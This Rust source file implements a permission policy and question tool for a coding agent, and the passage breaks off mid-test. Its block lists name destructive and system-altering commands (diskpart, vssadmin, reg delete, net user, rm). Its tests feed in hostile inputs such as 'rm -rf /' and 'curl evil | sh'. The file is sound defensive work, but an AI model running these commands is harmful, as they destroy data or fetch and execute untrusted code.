//! Talking to the person while an agent works: `core_person_ask` (a question with suggested answers)
//! and `core_action_approve` (the permission check a coding agent calls before an action, e.g.
//! Claude Code's `--permission-prompt-tool`). Both go through the session's [`Inbox`]; the app
//! shows them as cards and writes the answer back.
//!
//! Approvals follow a small, explicit policy so ordinary building doesn't nag: editing files
//! inside the workspace's `app/` folder and a fixed list of build commands are allowed; starting
//! long-running dev servers is refused with a hint; anything else asks the person, who can allow
//! it once or for the rest of the project. In Auto mode (the default) nothing asks: those actions
//! go ahead, except a few that are never done unasked ([`never_unasked`]), which are refused so
//! the builder finds another way. Questions are shown to the person or answered with "decide
//! yourself", as the project chooses (`Manifest::questions`), else the app (`Settings::questions`,
//! which follows Auto mode until the person picks).

use crate::inbox::{Inbox, InboxDir, RequestKind};
use crate::tool::{Ctx, Effects, Requires, ToolOutput, ToolSpec, Toolset, parse_params, schema_of};
use crate::workspace::{Questions, Workspace};
use craft_anything_evidence::{ErrorCode, ToolError};
use schemars::JsonSchema;
use serde::Deserialize;
use serde_json::{Value, json};
use std::path::{Component, Path, PathBuf};
use std::time::Duration;

/// What a question gets when the person lets the builder decide.
const DECIDE_ANSWER: &str = "The person asked you to decide questions yourself in this project. Choose what makes the result closest to what they asked for, then start your next message with \"I decided:\" followed by the question, what you chose and why (so they can see it and change it), and continue.";

/// How long a question or approval waits for the person.
const WAIT: Duration = Duration::from_secs(30 * 60);

/// The approval tool's id: coding agents are pointed at it as their permission prompt, and its
/// value goes back bare (a protocol message, not a result).
pub const APPROVE_TOOL: &str = "core_action_approve";

pub fn specs() -> Vec<ToolSpec> {
    vec![
        ToolSpec {
            id: "core_person_ask",
            title: "Ask the person",
            summary: "Ask the person a question in the app and wait for the answer: a short question, up to six suggested answers shown as buttons, and optionally a typed reply. Use it when a choice changes the result (scope, style, which feature first) and you can't decide from the evidence. Returns the answer text, or a note to continue with your best judgement if nobody answers within 30 minutes.",
            beginner: "Lets the assistant ask you a quick question.",
            toolset: Toolset::Core,
            effects: Effects::CHANGES_UI_STATE,
            requires: Requires::Nothing,
            input_schema: schema_of::<AskParams>,
            run: core_person_ask,
        },
        ToolSpec {
            id: APPROVE_TOOL,
            title: "Approve an agent action",
            summary: "Permission check for a coding agent's action (tool name and input). Edits inside the workspace's app folder and common build commands are allowed; dev servers are refused with a hint; anything else asks the person. Returns {behavior: allow, updatedInput} or {behavior: deny, message}.",
            beginner: "Asks you before the assistant does something outside its project.",
            toolset: Toolset::Core,
            effects: Effects::CHANGES_UI_STATE,
            requires: Requires::Nothing,
            input_schema: schema_of::<ApproveParams>,
            run: core_action_approve,
        },
    ]
}

pub(crate) fn inbox(ctx: &Ctx<'_>) -> Option<Inbox> {
    ctx.session.ext.get::<InboxDir>().map(|d| Inbox::new(d.0.clone()))
}

pub(crate) fn workspace_of(inbox: &Inbox) -> Option<Workspace> {
    inbox.dir().parent().and_then(|root| Workspace::open(root).ok())
}

// ---------------------------------------------------------------------------------------------
// core_person_ask

#[derive(Debug, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct AskParams {
    /// The question, in plain words.
    pub question: String,
    /// Up to six short suggested answers, best first.
    #[serde(default)]
    pub choices: Vec<String>,
    /// Accept a typed answer too (default true).
    #[serde(default = "yes")]
    pub allow_text: bool,
    /// One or two sentences of context shown under the question.
    #[serde(default)]
    pub context: String,
}

fn yes() -> bool {
    true
}

fn core_person_ask(ctx: &mut Ctx<'_>, params: Value) -> Result<ToolOutput, ToolError> {
    let p: AskParams = parse_params(params)?;
    let question = p.question.trim();
    if question.is_empty() || question.len() > 2000 {
        return Err(ToolError::invalid("question must be 1..=2000 characters"));
    }
    let choices: Vec<String> = p.choices.iter().map(|c| c.trim().chars().take(120).collect::<String>()).filter(|c| !c.is_empty()).take(6).collect();
    let inbox = inbox(ctx);
    let project = inbox.as_ref().and_then(workspace_of);
    if ctx.session.settings.questions_in(project.as_ref().map(|w| &w.manifest)) == Questions::Decide {
        return Ok(ToolOutput::Value(json!({"answered": false, "note": DECIDE_ANSWER})));
    }
    let Some(inbox) = inbox else {
        return Err(ToolError::new(ErrorCode::FeatureMissing, "nobody is available to answer questions in this session")
            .with_remediation("Make a sensible choice, say which one you made and why, and continue."));
    };
    let id = inbox.post(RequestKind::Question, question, p.context.trim(), choices, p.allow_text || p.choices.is_empty(), None)?;
    ctx.report(None, "Waiting for your answer…");
    let cancel = ctx.cancel.clone();
    match inbox.wait(&id, WAIT, &|| cancel.is_cancelled()) {
        Some(a) => Ok(ToolOutput::Value(json!({"answered": true, "answer": a.as_text(), "choice": a.choice, "text": a.text}))),
        None => {
            Ok(ToolOutput::Value(json!({"answered": false, "note": "No answer came. Continue with your best judgement and state the assumption you made."})))
        }
    }
}

// ---------------------------------------------------------------------------------------------
// core_action_approve

/// The shape coding agents send for a permission check.
#[derive(Debug, Deserialize, JsonSchema)]
pub struct ApproveParams {
    /// The agent's tool, e.g. `Bash`, `Write`, `WebFetch`.
    pub tool_name: String,
    /// The tool's input, passed back unchanged when allowed.
    #[serde(default)]
    pub input: Value,
    #[serde(default)]
    pub tool_use_id: Option<String>,
}

/// What the policy decided before asking anyone.
#[derive(Debug, Clone, PartialEq)]
pub enum Decision {
    Allow,
    Deny(String),
    /// Ask the person: a one-line description and the action kind for "always allow".
    Ask {
        title: String,
        kind: String,
    },
}

/// Build commands that are fine to run inside the project without asking.
const SAFE_COMMANDS: &[&str] = &[
    "npm install",
    "npm i ",
    "npm ci",
    "npm run build",
    "npm run lint",
    "npm run test",
    "npm test",
    "npm run typecheck",
    "npm create vite",
    "npm init",
    "npm ls",
    "npm --version",
    "npx --yes create-vite",
    "npx create-vite",
    "npx tsc",
    "npx vite build",
    "npx vitest run",
    "npx next build",
    "npx shadcn@latest init",
    "npx shadcn@latest add",
    "npx shadcn init",
    "npx shadcn add",
    "npx --yes shadcn@latest init",
    "npx --yes shadcn@latest add",
    "npx eslint",
    "npx prettier",
    "node --version",
    "cargo build",
    // Runs the builder's own game (e.g. `cargo run -- --screenshot …`).
    "cargo run",
    "cargo check",
    "cargo test",
    "cargo fmt",
    "cargo clippy",
    "cargo new",
    "cargo init",
    "cargo add",
    "cargo tree",
    "cargo --version",
    "rustc --version",
    "git init",
    "git add",
    "git commit",
    "git status",
    "git diff",
    "git log",
    "git branch",
    "ls",
    "dir",
    "pwd",
    "mkdir",
    "cat ",
    "head ",
    "tail ",
    "wc ",
    "echo ",
];

/// Commands that never finish on their own; the app previews the build itself.
const SERVER_COMMANDS: &[&str] = &[
    "npm run dev",
    "npm start",
    "npm run start",
    "npm run preview",
    "npx vite",
    "vite",
    "npx serve",
    "npx next dev",
    "npx next start",
    "next dev",
    "cargo watch",
    "trunk serve",
];

/// One of [`SAFE_COMMANDS`], matched on whole words.
fn safe_command(part: &str) -> bool {
    let padded = format!("{part} ");
    SAFE_COMMANDS.iter().any(|s| padded.starts_with(s) && (s.ends_with(' ') || padded.get(s.len()..).is_some_and(|r| r.starts_with(' '))))
}

/// A command that never exits: a dev server (unless it's a listed build, as `npx vite build` is
/// while `npx vite` serves, #291) or anything in watch mode.
fn never_exits(part: &str) -> bool {
    let server = SERVER_COMMANDS.iter().any(|s| part == *s || part.starts_with(&format!("{s} ")));
    (server && !safe_command(part)) || part.split_whitespace().any(|w| w == "--watch")
}

/// Lexically resolve `p` against `base` (no filesystem access); `None` if it climbs above the root.
pub(crate) fn resolve(base: &Path, p: &str) -> Option<PathBuf> {
    let path = Path::new(p);
    let joined = if path.is_absolute() { path.to_path_buf() } else { base.join(path) };
    let mut out = PathBuf::new();
    for c in joined.components() {
        match c {
            Component::ParentDir => {
                if !out.pop() {
                    return None;
                }
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    Some(out)
}

pub(crate) use crate::workspace::inside;

/// The program a command part starts (a leading quoted path keeps its spaces) and the rest.
fn program_of(part: &str) -> (&str, &str) {
    match part.strip_prefix('"').and_then(|r| r.split_once('"')) {
        Some((prog, rest)) => (prog, rest),
        None => part.split_once(char::is_whitespace).unwrap_or((part, "")),
    }
}

/// A game engine's own build or check: Unity in batch mode, Godot headless or on a project,
/// Unreal's build scripts and command-line editor.
fn engine_build(part: &str) -> bool {
    let (prog, rest) = program_of(part);
    let norm = prog.replace('\\', "/").to_ascii_lowercase();
    let name = norm.rsplit('/').next().unwrap_or_default();
    let rest = rest.to_ascii_lowercase();
    match name {
        "unity.exe" | "unity" => rest.contains("-batchmode"),
        n if n.starts_with("godot") => rest.contains("--headless") || rest.contains("--path"),
        "runuat.bat" | "runuat.sh" | "build.bat" | "build.sh" => norm.contains("engine/build/batchfiles/"),
        "unrealeditor-cmd.exe" | "unrealeditor-cmd" => true,
        _ => false,
    }
}

/// A program the builder made inside app/ (to try its build, e.g. `--screenshot`). It must exist
/// there: a bare name such as `rm` would otherwise look like `app/rm`.
fn own_program(part: &str, app: &Path) -> bool {
    let (prog, _) = program_of(part);
    // The agent works from the workspace (app/'s parent) or from inside app/.
    let bases = [app.parent().unwrap_or(app), app];
    !prog.is_empty() && bases.iter().any(|b| resolve(b, prog).is_some_and(|p| inside(app, &p) && p != app && p.is_file()))
}

/// Decide a Bash command: every `&&`-joined part must be a safe build command, the game engine's
/// own build, the builder's own program in app/, or a `cd` that stays inside the project, with
/// no other shell control characters.
fn decide_command(cmd: &str, app: &Path) -> Decision {
    let c = cmd.trim();
    let first = c.split_whitespace().next().unwrap_or_default();
    let ask = || Decision::Ask { title: format!("Run a command: `{}`", c.chars().take(300).collect::<String>()), kind: format!("bash:{first}") };
    if c.is_empty() {
        return Decision::Deny("Empty command.".into());
    }
    let parts: Vec<&str> = c.split("&&").map(str::trim).collect();
    if parts.iter().any(|p| never_exits(p)) {
        return Decision::Deny(
            "Don't start dev servers or watchers: they never exit. Run `npm run build` (or `cargo build`) instead; Craft Anything serves and checks the build itself.".into(),
        );
    }
    if c.contains(['|', ';', '<', '>', '`', '$', '\n']) || c.replace("&&", "").contains('&') {
        return ask();
    }
    for part in parts {
        if let Some(dir) = part.strip_prefix("cd ") {
            match resolve(app, dir.trim().trim_matches('"')) {
                Some(p) if inside(app, &p) => continue,
                _ => return ask(),
            }
        }
        if !(safe_command(part) || engine_build(part) || own_program(part, app)) {
            return ask();
        }
    }
    Decision::Allow
}

/// The policy for one action. `ws` is the workspace the agent works in, if known.
pub fn decide(ws: Option<&Workspace>, tool: &str, input: &Value) -> Decision {
    let s = |k: &str| input.get(k).and_then(Value::as_str).unwrap_or_default().to_string();
    let kind = match tool {
        "Write" | "Edit" | "MultiEdit" | "NotebookEdit" => "edit-outside".to_string(),
        "Bash" => format!("bash:{}", s("command").split_whitespace().next().unwrap_or_default()),
        "WebFetch" | "WebSearch" => "web".to_string(),
        other => other.to_string(),
    };
    if ws.is_some_and(|w| w.manifest.allowed_actions.contains(&kind)) {
        return Decision::Allow;
    }
    let app = ws.map(Workspace::app_dir);
    match tool {
        "Read" | "Glob" | "Grep" | "LS" | "TodoWrite" => Decision::Allow,
        "Write" | "Edit" | "MultiEdit" | "NotebookEdit" => {
            let target = if tool == "NotebookEdit" { s("notebook_path") } else { s("file_path") };
            // app/ is what it builds; checks/ holds its own notes and screenshots. The inbox (where
            // approvals are answered), the manifest and the person's pictures stay out of reach,
            // also when the app is the project folder itself.
            let checks = ws.map(Workspace::checks_dir);
            match (&app, resolve(app.as_deref().unwrap_or(Path::new("/")), &target)) {
                (Some(app), Some(p)) if (inside(app, &p) || checks.as_ref().is_some_and(|c| inside(c, &p))) && !ws.is_some_and(|w| w.is_own_record(&p)) => {
                    Decision::Allow
                }
                _ => Decision::Ask { title: format!("Change a file outside the project: {target}"), kind },
            }
        }
        "Bash" => match &app {
            Some(app) => decide_command(&s("command"), app),
            None => Decision::Ask { title: format!("Run a command: `{}`", s("command")), kind },
        },
        // Reading the web changes nothing (references, engine docs).
        "WebFetch" | "WebSearch" => Decision::Allow,
        other => Decision::Ask { title: format!("Use {other}"), kind },
    }
}

/// Run the approval policy for one action of a builder (`tool` and `input` in Claude Code's
/// shape: `Write {file_path}`, `Bash {command}`…): allowed by the policy or Auto mode, refused, or
/// asked of the person through the session's inbox. `Ok(Err(why))` means don't do it.
pub(crate) fn approve(ctx: &mut Ctx<'_>, tool: &str, input: &Value) -> Result<Result<(), String>, ToolError> {
    let inbox = inbox(ctx);
    let (auto_mode, clean_room) = (ctx.session.settings.auto_mode, ctx.session.clean_room());
    let cancel = ctx.cancel.clone();
    let mut waiting = || ctx.report(None, "Waiting for your OK…");
    approve_with(inbox, auto_mode, clean_room, tool, input, &|| cancel.is_cancelled(), &mut waiting)
}

/// [`approve`] for callers outside a tool call (a client answering an agent's permission request
/// for one project): the project's inbox, whether Auto mode is on, whether Clean room is (it
/// refuses anything that reaches the original, whatever else allows it), how to tell a stop, and
/// what to do while the person is being asked.
pub fn approve_with(
    inbox: Option<Inbox>,
    auto_mode: bool,
    clean_room: bool,
    tool: &str,
    input: &Value,
    cancelled: &dyn Fn() -> bool,
    waiting: &mut dyn FnMut(),
) -> Result<Result<(), String>, ToolError> {
    let mut ws = inbox.as_ref().and_then(workspace_of);
    if clean_room && let Some(why) = off_limits(ws.as_ref(), tool, input) {
        return Ok(Err(why));
    }
    match decide(ws.as_ref(), tool, input) {
        Decision::Allow => Ok(Ok(())),
        Decision::Deny(m) => Ok(Err(m)),
        // Auto mode: keep going; only what's never done unasked is refused, without stopping.
        Decision::Ask { .. } if auto_mode => Ok(match never_unasked(ws.as_ref(), tool, input) {
            Some(why) => Err(why),
            None => Ok(()),
        }),
        Decision::Ask { title, kind } => {
            let Some(inbox) = inbox else {
                return Ok(Err("Nobody is available to approve this. Stay inside the project folder and use the build commands.".into()));
            };
            let detail = serde_json::to_string_pretty(input).unwrap_or_default().chars().take(4000).collect::<String>();
            waiting();
            Ok(match wait_for_approval(&inbox, ws.as_mut(), &title, &detail, &kind, cancelled)? {
                Verdict::Yes => Ok(()),
                Verdict::No(text) => {
                    Err(format!("The person said no{}. Find another way or ask them with core_person_ask.", text.map(|t| format!(": {t}")).unwrap_or_default()))
                }
                Verdict::NoAnswer => Err("No answer came in time, so this wasn't done. Continue without it if you can.".into()),
            })
        }
    }
}

/// What a Clean room builder is told when it reaches for the original.
const OFF_LIMITS: &str = "Clean room: the original (its files, its folder, its pages and its code) is off limits. Work from capture/, reference/ and what the person tells you; if you need to look inside, say so and the person can switch on Deep mode.";

/// Clean room: the builder's own tools keep away from the original. `Some(why)` refuses an action
/// that would read, list, change or run anything in a local target's folder (the project's own
/// folder excepted), or fetch a website target's pages.
pub fn off_limits(ws: Option<&Workspace>, tool: &str, input: &Value) -> Option<String> {
    let ws = ws?;
    let s = |k: &str| input.get(k).and_then(Value::as_str).unwrap_or_default().to_string();
    let refused = match &ws.manifest.target {
        crate::workspace::TargetRef::Local { path } => {
            // The original and, when it's one file, the folder it sits in.
            let root = if path.is_file() { path.parent().unwrap_or(path) } else { path.as_path() };
            let touches = |p: &str| !p.is_empty() && resolve(&ws.root, p).is_some_and(|p| inside(root, &p) && !inside(&ws.root, &p));
            match tool {
                "Read" | "Write" | "Edit" | "MultiEdit" => touches(&s("file_path")),
                "NotebookRead" | "NotebookEdit" => touches(&s("notebook_path")),
                "Glob" | "Grep" | "LS" => touches(&s("path")) || mentions(&s("pattern"), root) || mentions(&s("glob"), root),
                "Bash" | "PowerShell" => mentions(&s("command"), root),
                _ => false,
            }
        }
        crate::workspace::TargetRef::Website { url } => match host_of(url) {
            Some(host) => match tool {
                "WebFetch" => host_of(&s("url")).is_some_and(|h| same_site(&h, &host)),
                "Bash" | "PowerShell" => s("command").to_ascii_lowercase().contains(&host),
                _ => false,
            },
            None => false,
        },
        crate::workspace::TargetRef::None => false,
    };
    refused.then(|| OFF_LIMITS.to_string())
}

/// Whether `text` names `dir` in any of the ways a command could (either slash, any case, and
/// Git Bash's `/c/…` for `C:\…`).
fn mentions(text: &str, dir: &Path) -> bool {
    let norm = |s: &str| s.to_lowercase().replace('\\', "/");
    let text = norm(text);
    let d = norm(&dir.to_string_lossy());
    let d = d.trim_end_matches('/');
    if d.is_empty() {
        return false;
    }
    let bash = d.split_once(":/").map(|(drive, rest)| format!("/{drive}/{rest}"));
    text.contains(d) || bash.is_some_and(|b| text.contains(&b))
}

/// The host of an http(s) address, lower case, without a leading `www.`.
fn host_of(url: &str) -> Option<String> {
    let rest = url.trim().split_once("://")?.1;
    let host = rest.split(['/', '?', '#']).next()?.rsplit('@').next()?.split(':').next()?.to_ascii_lowercase();
    let host = host.strip_prefix("www.").unwrap_or(&host).to_string();
    (!host.is_empty()).then_some(host)
}

/// The same site: one host, or one inside the other (`app.example.com` and `example.com`).
fn same_site(a: &str, b: &str) -> bool {
    a == b || a.ends_with(&format!(".{b}")) || b.ends_with(&format!(".{a}"))
}

fn core_action_approve(ctx: &mut Ctx<'_>, params: Value) -> Result<ToolOutput, ToolError> {
    let p: ApproveParams = parse_params(params)?;
    Ok(match approve(ctx, &p.tool_name, &p.input)? {
        Ok(()) => ToolOutput::Value(json!({"behavior": "allow", "updatedInput": p.input})),
        Err(m) => ToolOutput::Value(json!({"behavior": "deny", "message": m})),
    })
}

/// In Auto mode, what's still never done without the person: deleting outside the project,
/// changing system files or settings, shutting down, and publishing anywhere. `Some(why)` refuses it.
pub fn never_unasked(ws: Option<&Workspace>, tool: &str, input: &Value) -> Option<String> {
    let s = |k: &str| input.get(k).and_then(Value::as_str).unwrap_or_default().to_string();
    let refuse = |what: &str| Some(format!("Auto mode never {what} without the person. Find another way, or leave it and say so in your summary."));
    match tool {
        "Write" | "Edit" | "MultiEdit" | "NotebookEdit" => {
            let target = if tool == "NotebookEdit" { s("notebook_path") } else { s("file_path") };
            let p = resolve(ws.map(|w| w.root.clone()).as_deref().unwrap_or(Path::new("/")), &target)?;
            let system = SYSTEM_DIRS.iter().any(|d| inside(Path::new(d), &p));
            // The inbox (where answers are written), the manifest and the other records stay out of reach.
            let ours = ws.is_some_and(|w| w.is_own_record(&p));
            (system || ours).then(|| refuse("changes system files or Craft Anything's own records")).flatten()
        }
        "Bash" | "PowerShell" => {
            let c = s("command").to_ascii_lowercase();
            if PUBLISH.iter().any(|k| c.contains(k)) {
                return refuse("publishes or pushes anything");
            }
            if SYSTEM_COMMANDS.iter().any(|k| c.contains(k)) {
                return refuse("changes the system, its settings or its users, or shuts it down");
            }
            if DELETES.iter().any(|k| c.contains(k)) && deletes_outside(&c, ws) {
                return refuse("deletes anything outside the project or the temp folder");
            }
            None
        }
        _ => None,
    }
}

const SYSTEM_DIRS: &[&str] =
    &["C:/Windows", "C:/Program Files", "C:/Program Files (x86)", "C:/ProgramData", "/etc", "/usr", "/bin", "/sbin", "/System", "/Library"];
const PUBLISH: &[&str] = &["git push", "npm publish", "cargo publish", "gh release", "gh pr ", "gh repo", "twine upload", "docker push"];
const SYSTEM_COMMANDS: &[&str] = &[
    "shutdown",
    "restart-computer",
    "stop-computer",
    "format-volume",
    "format c:",
    "diskpart",
    "bcdedit",
    "reg add",
    "reg delete",
    "reg import",
    "-path hk",
    "-path 'hk",
    "-path \"hk",
    "remove-itemproperty",
    "set-executionpolicy",
    "netsh",
    "sc delete",
    "sc config",
    "takeown",
    "icacls",
    "cipher /w",
    "vssadmin",
    "schtasks /create",
    "net user",
    "net localgroup",
    "runas ",
    "sudo ",
    "set-mppreference",
    "disable-netadapter",
];
const DELETES: &[&str] = &["rm ", "rmdir", "rd /s", "del ", "erase ", "remove-item", "ri ", "unlink "];

/// Whether a deleting command reaches outside the project folder (and the temp folder): any
/// absolute, home-relative or climbing path that isn't inside them.
fn deletes_outside(command: &str, ws: Option<&Workspace>) -> bool {
    let temp = std::env::temp_dir();
    let roots: Vec<PathBuf> = ws.map(|w| w.root.clone()).into_iter().chain([temp, PathBuf::from("/tmp"), PathBuf::from("c:/tmp")]).collect();
    command.split(|c: char| c.is_whitespace() || c == '"' || c == '\'').any(|tok| {
        if tok.contains("..") || tok.starts_with('~') || tok.contains("$home") || tok.contains("%userprofile%") || tok.contains("$env:") {
            return true;
        }
        // Git Bash writes C:\x as /c/x.
        let tok = tok.strip_prefix("/c/").map(|r| format!("c:/{r}")).unwrap_or_else(|| tok.to_string());
        let absolute = tok.starts_with('/') || tok.get(1..3).is_some_and(|d| d == ":/" || d == ":\\");
        absolute && !roots.iter().any(|r| inside(r, Path::new(&tok)))
    })
}

/// What the person said to an approval card.
pub(crate) enum Verdict {
    Yes,
    /// No, with what they typed, if anything.
    No(Option<String>),
    NoAnswer,
}

/// Show an approval card and wait for the answer. "Always for this project" is remembered in the
/// workspace as `kind`, so the same kind of action isn't asked about again.
pub(crate) fn ask_approval(ctx: &mut Ctx<'_>, inbox: &Inbox, ws: Option<&mut Workspace>, title: &str, detail: &str, kind: &str) -> Result<Verdict, ToolError> {
    ctx.report(None, "Waiting for your OK…");
    let cancel = ctx.cancel.clone();
    wait_for_approval(inbox, ws, title, detail, kind, &|| cancel.is_cancelled())
}

fn wait_for_approval(
    inbox: &Inbox,
    ws: Option<&mut Workspace>,
    title: &str,
    detail: &str,
    kind: &str,
    cancelled: &dyn Fn() -> bool,
) -> Result<Verdict, ToolError> {
    let id = inbox.post(RequestKind::Approval, title, detail, Vec::new(), false, Some(kind.to_string()))?;
    Ok(match inbox.wait(&id, WAIT, cancelled) {
        Some(a) if a.allow == Some(true) => {
            if a.always
                && let Some(w) = ws
            {
                let _ = w.set_person(|m| {
                    if !m.allowed_actions.iter().any(|k| k == kind) {
                        m.allowed_actions.push(kind.to_string());
                    }
                });
            }
            Verdict::Yes
        }
        Some(a) => Verdict::No(a.text),
        None => Verdict::NoAnswer,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::workspace::TargetRef;

    fn ws() -> (tempfile::TempDir, Workspace) {
        let dir = tempfile::tempdir().unwrap();
        let w = Workspace::create(dir.path(), "t", "r", TargetRef::None).unwrap();
        (dir, w)
    }

    #[test]
    fn approval_outside_a_tool_call_follows_the_same_policy() {
        let (_d, w) = ws();
        let inbox = || Some(Inbox::new(w.inbox_dir()));
        let inside = json!({"file_path": w.app_dir().join("main.rs").display().to_string()});
        let mut asked = false;
        assert_eq!(approve_with(inbox(), false, false, "Write", &inside, &|| false, &mut || asked = true).unwrap(), Ok(()));
        assert!(!asked, "allowed by the policy without asking");
        // Outside the project in Auto mode: allowed without asking; with nobody to ask: refused.
        let outside = json!({"file_path": "/elsewhere/notes.txt"});
        assert_eq!(approve_with(inbox(), true, false, "Write", &outside, &|| false, &mut || {}).unwrap(), Ok(()));
        assert!(approve_with(None, false, false, "Write", &outside, &|| false, &mut || {}).unwrap().is_err());
    }

    #[test]
    fn clean_room_keeps_the_builder_away_from_the_original() {
        let dir = tempfile::tempdir().unwrap();
        let game = dir.path().join("Games").join("Some Game");
        std::fs::create_dir_all(&game).unwrap();
        let w = Workspace::create(&dir.path().join("projects"), "g", "Recreate this game", TargetRef::Local { path: game.clone() }).unwrap();
        let inbox = || Some(Inbox::new(w.inbox_dir()));
        let file = |p: &std::path::Path| json!({"file_path": p.join("data.ini").display().to_string()});
        let refused = |tool: &str, input: &Value| approve_with(inbox(), true, true, tool, input, &|| false, &mut || {}).unwrap().is_err();
        assert!(refused("Read", &file(&game)), "its files are off limits, even in Auto mode");
        assert!(refused("Glob", &json!({"path": game.display().to_string(), "pattern": "**/*"})));
        assert!(refused("Grep", &json!({"pattern": "speed", "path": game.display().to_string()})));
        let shown = game.display().to_string();
        assert!(refused("Bash", &json!({"command": format!("strings \"{shown}/Game.exe\" | head")})));
        assert!(refused("Bash", &json!({"command": format!("cat {}", shown.replace('\\', "/").to_uppercase())})), "any spelling of its folder");
        assert!(!refused("Read", &file(&w.app_dir())), "the project stays open");
        assert_eq!(approve_with(inbox(), true, false, "Read", &file(&game), &|| false, &mut || {}).unwrap(), Ok(()), "Deep mode may read it");

        let site =
            Workspace::create(&dir.path().join("projects"), "s", "Recreate this website", TargetRef::Website { url: "https://www.Example.com/pricing".into() })
                .unwrap();
        let fetch = |url: &str| off_limits(Some(&site), "WebFetch", &json!({"url": url})).is_some();
        assert!(fetch("https://example.com/") && fetch("http://app.example.com/x?y") && fetch("https://WWW.EXAMPLE.COM"));
        assert!(!fetch("https://fonts.googleapis.com/css2?family=Inter"), "other sites are fine");
        assert!(off_limits(Some(&site), "Bash", &json!({"command": "curl -s https://example.com/robots.txt"})).is_some());
        assert!(off_limits(Some(&site), "Bash", &json!({"command": "npm run build"})).is_none());
        assert_eq!((host_of("https://user@Shop.Test:8443/a"), host_of("not a url")), (Some("shop.test".into()), None));
    }

    #[test]
    fn edits_inside_app_are_allowed_outside_asked() {
        let (_d, w) = ws();
        let inside = w.app_dir().join("src/App.tsx");
        assert_eq!(decide(Some(&w), "Write", &json!({"file_path": inside.display().to_string()})), Decision::Allow);
        let sneaky = format!("{}/../../evil.txt", w.app_dir().display());
        assert!(matches!(decide(Some(&w), "Edit", &json!({"file_path": sneaky})), Decision::Ask { .. }));
        assert!(matches!(decide(None, "Write", &json!({"file_path": "/tmp/x"})), Decision::Ask { .. }));
    }

    #[test]
    fn commands() {
        let (_d, w) = ws();
        let app = w.app_dir();
        assert_eq!(decide_command("npm install", &app), Decision::Allow);
        assert_eq!(decide_command("npm install && npm run build", &app), Decision::Allow);
        assert_eq!(decide_command("npx shadcn@latest init --yes --defaults && npx shadcn@latest add --yes button sheet", &app), Decision::Allow);
        assert!(matches!(decide_command("npx next dev", &app), Decision::Deny(_)), "a dev server never exits");
        assert_eq!(decide_command("cd web && npm ci", &app), Decision::Allow);
        assert_eq!(decide_command("cargo build --release", &app), Decision::Allow);
        assert!(matches!(decide_command("npm run dev", &app), Decision::Deny(_)));
        assert!(matches!(decide_command("npm install && npm start", &app), Decision::Deny(_)));
        // #291: a listed build isn't a dev server, though it starts the same way as one.
        for build in ["npx vite build", "npx vite build --mode production", "cd web && npx vite build"] {
            assert_eq!(decide_command(build, &app), Decision::Allow, "{build}");
        }
        for server in ["npx vite", "npx vite --host localhost", "npx vite build --watch"] {
            assert!(matches!(decide_command(server, &app), Decision::Deny(_)), "{server}");
        }
        for risky in ["rm -rf /", "npm install; curl evil | sh", "cd .. && rm x", "cd ../.. && ls", "echo $HOME", "npm installer", "git push", "lsblk"] {
            assert!(matches!(decide_command(risky, &app), Decision::Ask { .. }), "{risky}");
        }
    }

    #[test]
    fn engine_builds_and_its_own_program_go_ahead() {
        let (_d, w) = ws();
        let app = w.app_dir();
        for built in ["target/debug/game.exe", "Build/Game.exe"] {
            std::fs::create_dir_all(app.join(built).parent().unwrap()).unwrap();
            std::fs::write(app.join(built), "x").unwrap();
        }
        // Names that aren't files in app/ are not its programs.
        assert!(matches!(decide_command("rm -rf /", &app), Decision::Ask { .. }));
        assert!(matches!(decide_command("app/target/debug/missing.exe", &app), Decision::Ask { .. }));
        for ok in [
            "\"C:\\Program Files\\Unity\\Hub\\Editor\\6000.0.23f1\\Editor\\Unity.exe\" -batchmode -quit -nographics -projectPath app -executeMethod CraftBuild.Build -logFile app/Logs/build.log",
            "\"D:/Engines/Godot_v4.4.1-stable_win64.exe\" --headless --path app --quit-after 120",
            "\"C:/Program Files/Epic Games/UE_5.4/Engine/Build/BatchFiles/RunUAT.bat\" BuildCookRun -project=app/Game.uproject",
            "cargo run -- --screenshot shots/now.png",
            "app/target/debug/game.exe --screenshot app/shots/now.png",
            "cd app && ./Build/Game.exe --screenshot shots/now.png",
        ] {
            assert_eq!(decide_command(ok, &app), Decision::Allow, "{ok}");
        }
        for ask in [
            "\"C:/Unity/Editor/Unity.exe\" -projectPath app",
            "\"D:/Games/Arena/bin_win32/arena_client.exe\"",
            "C:/Program Files/Tool/tool.exe",
            "../elsewhere/tool.exe",
            "app/target/debug/game.exe > out.txt",
            "\"C:/x/build.bat\"",
        ] {
            assert!(matches!(decide_command(ask, &app), Decision::Ask { .. }), "{ask}");
        }
    }

    #[test]
    fn web_reads_and_notes_go_ahead_the_inbox_never_does() {
        let (_d, w) = ws();
        assert_eq!(decide(Some(&w), "WebFetch", &json!({"url": "https://docs.godotengine.org"})), Decision::Allow);
        assert_eq!(decide(Some(&w), "WebSearch", &json!({"query": "unity batchmode build"})), Decision::Allow);
        let note = w.checks_dir().join("round-1/notes.md");
        assert_eq!(decide(Some(&w), "Write", &json!({"file_path": note.display().to_string()})), Decision::Allow);
        for off in [w.inbox_dir().join("1.answer.json"), w.root.join("craft.json"), w.root.join("reference/picture-1.png")] {
            assert!(matches!(decide(Some(&w), "Write", &json!({"file_path": off.display().to_string()})), Decision::Ask { .. }), "{off:?}");
        }
    }

    #[test]
    fn remembered_kinds_and_reads() {
        let (_d, mut w) = ws();
        let cmd = json!({"command": "lsblk"});
        assert!(matches!(decide(Some(&w), "Bash", &cmd), Decision::Ask { .. }));
        w.manifest.allowed_actions.push("bash:lsblk".into());
        assert_eq!(decide(Some(&w), "Bash", &cmd), Decision::Allow, "\"always for this project\" is remembered");
        assert_eq!(decide(None, "Read", &json!({})), Decision::Allow);
    }

    #[test]
    fn approval_round_trip_through_the_inbox() {
        let (_d, w) = ws();
        let e = std::sync::Arc::new(crate::Engine::new(crate::testing::session()));
        // Asking is what Auto mode switches off.
        e.session().settings.auto_mode = false;
        e.session().ext.insert(std::sync::Arc::new(InboxDir(w.inbox_dir())));
        let inbox = Inbox::new(w.inbox_dir());
        let answerer = std::thread::spawn(move || {
            for _ in 0..100 {
                if let Some(r) = inbox.pending().first() {
                    assert!(r.title.contains("git push"));
                    inbox.answer(&r.id, &crate::inbox::Answer { allow: Some(true), always: true, ..Default::default() }).unwrap();
                    return;
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            panic!("no request arrived");
        });
        let out =
